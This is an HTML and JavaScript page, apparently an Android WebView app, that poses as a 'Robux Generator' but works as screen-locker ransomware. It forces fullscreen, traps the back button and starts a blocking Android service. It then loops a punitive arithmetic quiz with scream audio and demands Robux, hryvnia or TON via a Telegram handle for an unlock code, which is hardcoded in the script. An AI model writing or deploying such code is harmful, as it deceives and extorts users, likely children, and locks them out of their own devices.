<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Robux Generator</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body, html { width:100%; height:100%; overflow:hidden; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#0b0c10; color:white; user-select:none; -webkit-user-select:none; -webkit-touch-callout:none; }

        #screen-normal {
            display:flex; flex-direction:column; align-items:center; justify-content:center;
            height:100%; background:linear-gradient(145deg, #1a1a2e, #16213e); padding:20px;
        }
        .logo { font-size:4em; font-weight:900; background:linear-gradient(45deg, #ff4444, #ff8c00); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; margin-bottom:10px; text-shadow:0 0 20px rgba(255,68,68,0.5); }
        .subtitle { font-size:1.4em; color:#ccc; margin-bottom:40px; }
        input[type="text"] {
            width:80%; max-width:300px; padding:15px 20px; font-size:1.2em; border:2px solid #333;
            border-radius:30px; background:#121212; color:white; outline:none; text-align:center;
            margin-bottom:30px; transition:border 0.3s;
        }
        input[type="text"]:focus { border-color:#ff4444; }
        .btn {
            background:linear-gradient(45deg, #ff4444, #ff6600); border:none; padding:15px 40px;
            font-size:1.3em; font-weight:bold; border-radius:40px; color:white; cursor:pointer;
            box-shadow:0 0 25px rgba(255,68,68,0.7); transition:transform 0.2s;
        }
        .btn:active { transform:scale(0.96); }

        #screen-blocked {
            display:none; flex-direction:column; align-items:center; justify-content:center;
            height:100%; background:#000; padding:20px; text-align:center;
        }
        .blocked-title {
            font-size:2.5em; font-weight:800; color:#ff0000; text-shadow:0 0 30px red;
            margin-bottom:20px; animation:pulse 1s infinite;
        }
        @keyframes pulse {
            0%{ text-shadow:0 0 15px red; } 50%{ text-shadow:0 0 40px red, 0 0 20px orange; } 100%{ text-shadow:0 0 15px red; }
        }
        .quest-box {
            background:rgba(20,20,20,0.9); border:2px solid #ff4444; border-radius:20px;
            padding:25px; width:90%; max-width:350px;
        }
        .example { font-size:2em; font-weight:bold; margin:15px 0; }
        .progress { color:#aaa; margin-bottom:10px; }
        .answer-input {
            width:100%; padding:12px; font-size:1.2em; border:2px solid #555;
            border-radius:15px; background:#0a0a0a; color:white; text-align:center;
            outline:none; margin:10px 0 20px;
        }
        .answer-input:focus { border-color:#ff0000; }
        .btn-answer {
            background:#ff3333; border:none; padding:12px 30px; border-radius:30px;
            font-size:1.1em; font-weight:bold; color:white;
        }
        .final-message {
            padding:20px; display:flex; flex-direction:column; gap:15px; align-items:center;
        }
        .password-input {
            width:80%; padding:12px; font-size:1.2em; border:2px solid #f00;
            border-radius:15px; background:#000; color:#fff; text-align:center;
        }
    </style>
</head>
<body>

<div id="screen-normal">
    <div class="logo">ROBUX</div>
    <div class="subtitle">Генератор Робуксов v5.2</div>
    <input type="text" id="nickname" placeholder="Введите ваш ник" autocomplete="off">
    <button class="btn" id="start-btn">▶ Начать получение</button>
</div>

<div id="screen-blocked">
    <div class="blocked-title">СИСТЕМА ЗАБЛОКИРОВАНА</div>
    <div style="color:#ff5555; margin-bottom:20px;">ОБНАРУЖЕН ВЗЛОМ</div>
    <div class="quest-box" id="quest-container">
        <div class="progress" id="progress-text">Пример 1 из 10</div>
        <div class="example" id="example-text">7 + 3 = ?</div>
        <input type="text" class="answer-input" id="answer-input" placeholder="Ответ" autocomplete="off">
        <button class="btn-answer" id="check-btn">Ответить</button>
    </div>
    <div id="final-container" style="display:none;">
        <div class="final-message">
            <div style="font-weight:bold; font-size:1.3em;">🔐 ВВЕДИТЕ КЛЮЧ РАЗБЛОКИРОВКИ</div>
            <input type="text" class="password-input" id="unlock-input" placeholder="Код" autocomplete="off">
            <button class="btn-answer" id="unlock-btn">Разблокировать</button>
            <p style="font-size:0.9em; color:#aaa;">Telegram: @Virussupp0rt<br>Цена: 100 Robux / 50 грн / 1 TON</p>
        </div>
    </div>
</div>

<audio id="scream-audio" preload="auto">
    <source src="https://www.soundjay.com/human/sounds/scream-01.mp3" type="audio/mpeg">
    <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg">
</audio>

<script>
(function() {
    const screenNormal = document.getElementById('screen-normal');
    const screenBlocked = document.getElementById('screen-blocked');
    const startBtn = document.getElementById('start-btn');
    const nicknameInput = document.getElementById('nickname');
    const answerInput = document.getElementById('answer-input');
    const checkBtn = document.getElementById('check-btn');
    const exampleText = document.getElementById('example-text');
    const progressText = document.getElementById('progress-text');
    const questContainer = document.getElementById('quest-container');
    const finalContainer = document.getElementById('final-container');
    const unlockInput = document.getElementById('unlock-input');
    const unlockBtn = document.getElementById('unlock-btn');
    const screamAudio = document.getElementById('scream-audio');

    let blockTimer = null;
    let questProgress = 0;
    let currentAnswer = null;
    let blocked = false;

    function exitApp() {
        if (window.Android && window.Android.unlockAndExit) {
            Android.unlockAndExit();
        } else {
            window.close();
        }
    }

    function checkSecretCode(inputElement) {
        if (inputElement.value.trim() === '6677') exitApp();
    }
    nicknameInput.addEventListener('input', () => checkSecretCode(nicknameInput));
    answerInput.addEventListener('input', () => checkSecretCode(answerInput));

    function lockBackButton() {
        history.pushState(null, '', location.href);
        history.pushState(null, '', location.href);
        window.addEventListener('popstate', () => {
            history.pushState(null, '', location.href);
            if (document.fullscreenEnabled) document.documentElement.requestFullscreen();
        });
    }

    function generateExample() {
        const ops = ['+', '-', '*', '/'];
        const op = ops[Math.floor(Math.random() * ops.length)];
        let a, b;
        if (op === '+') { a=Math.floor(Math.random()*50)+1; b=Math.floor(Math.random()*50)+1; currentAnswer=a+b; }
        else if (op === '-') { a=Math.floor(Math.random()*50)+20; b=Math.floor(Math.random()*a)+1; currentAnswer=a-b; }
        else if (op === '*') { a=Math.floor(Math.random()*12)+1; b=Math.floor(Math.random()*12)+1; currentAnswer=a*b; }
        else if (op === '/') { b=Math.floor(Math.random()*10)+1; a=b*(Math.floor(Math.random()*10)+1); currentAnswer=a/b; }
        return a + ' ' + op + ' ' + b + ' = ?';
    }

    function showNewExample() {
        exampleText.textContent = generateExample();
        answerInput.value = '';
        answerInput.focus();
    }

    function resetQuest() {
        questProgress = 0;
        progressText.textContent = 'Пример 1 из 10';
        showNewExample();
        if (window.Android && Android.vibrate) Android.vibrate(500);
        screamAudio.currentTime = 0;
        screamAudio.play().catch(()=>{});
        screenBlocked.style.transform = 'translateX(5px)';
        setTimeout(() => screenBlocked.style.transform = '', 100);
    }

    function showFinal() {
        questContainer.style.display = 'none';
        finalContainer.style.display = 'flex';
        unlockInput.focus();
        // Дополнительный скример на финише
        if (Android && Android.vibrate) Android.vibrate(300);
        screamAudio.play().catch(()=>{});
    }

    function handleAnswer() {
        const val = answerInput.value.trim();
        if (val === '6677') { exitApp(); return; }
        const userAnswer = parseInt(val, 10);
        if (isNaN(userAnswer)) return;
        if (userAnswer === currentAnswer) {
            questProgress++;
            if (questProgress >= 10) {
                showFinal();
            } else {
                progressText.textContent = 'Пример ' + (questProgress+1) + ' из 10';
                showNewExample();
            }
        } else {
            resetQuest();
        }
    }

    // Активация пранка (без сворачивания)
    function activateBlock() {
        if (blocked) return;
        blocked = true;
        if (blockTimer) clearTimeout(blockTimer);
        screenNormal.style.display = 'none';
        screenBlocked.style.display = 'flex';
        questProgress = 0;
        progressText.textContent = 'Пример 1 из 10';
        showNewExample();
        questContainer.style.display = 'block';
        finalContainer.style.display = 'none';

        // Запускаем сервис с уведомлением и включаем флаг в активити
        if (window.Android && Android.startBlockService) {
            Android.startBlockService();
        }
    }

    // Инициализация
    lockBackButton();
    if (document.fullscreenEnabled) document.documentElement.requestFullscreen();

    blockTimer = setTimeout(activateBlock, 10000);

    startBtn.addEventListener('click', activateBlock);
    checkBtn.addEventListener('click', handleAnswer);
    answerInput.addEventListener('keydown', (e) => { if (e.key==='Enter') handleAnswer(); });

    unlockBtn.addEventListener('click', () => {
        if (unlockInput.value.trim() === '6677') {
            if (Android && Android.vibrate) Android.vibrate(200);
            exitApp();
        } else {
            if (Android && Android.vibrate) Android.vibrate(800);
            screamAudio.currentTime = 0;
            screamAudio.play().catch(()=>{});
            unlockInput.value = '';
            unlockInput.placeholder = 'НЕВЕРНЫЙ КОД!';
            setTimeout(() => unlockInput.placeholder = 'Код', 2000);
        }
    });
    unlockInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') unlockBtn.click();
        checkSecretCode(unlockInput);
    });

    // Если приложение вернулось в фокус
    window.addEventListener('pageshow', () => {
        if (blocked) {
            screenNormal.style.display = 'none';
            screenBlocked.style.display = 'flex';
            if (window.Android && Android.restartServiceIfNeeded) {
                Android.restartServiceIfNeeded();
            }
        }
    });

})();
</script>
</body>
</html>
